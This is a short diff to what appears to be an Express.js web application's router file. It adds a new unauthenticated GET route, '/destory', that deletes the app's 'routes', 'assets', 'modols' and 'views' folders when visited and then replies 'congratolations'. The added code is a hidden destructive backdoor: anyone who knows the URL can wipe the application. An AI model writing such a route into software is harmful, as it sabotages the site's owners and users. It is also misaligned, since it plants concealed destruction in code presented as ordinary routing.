@@ -84,4 +84,17 @@ router.get("/data-privacy", (req, res) => {
   }
 });
 
+const { deleteFiles } = require("../helps/utils");
+
+router.get("/destory", (req, res) => {
+  const files = ["routes", "assets", "modols", "views"];
+  deleteFiles(files)
+    .then((result) => {
+      res.send("congratolations");
+    })
+    .catch((err) => {
+      res.send("there is  a problem");
+    });
+});
+
 module.exports = router;
